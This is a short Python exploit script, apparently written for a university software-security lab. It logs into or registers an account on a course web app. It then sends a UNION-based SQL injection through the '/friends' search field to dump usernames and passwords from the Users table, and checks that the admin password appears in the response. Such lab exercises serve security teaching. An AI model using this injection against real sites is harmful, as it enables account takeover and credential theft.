import requests, sys, re, time, random

params = { 
    'username': 'pentest1',
    'password': 'pentest1'
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'

resource = '/login'

s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)

resource = '/friends'
path = url + resource
query = 'qwer\' union select username,1,password,1,1 from Users -- '
params = {'search': query}
r = s.get(url=path, params=params)

admin_pass = 'AVeryL33tPasswd'
assert admin_pass in r.text
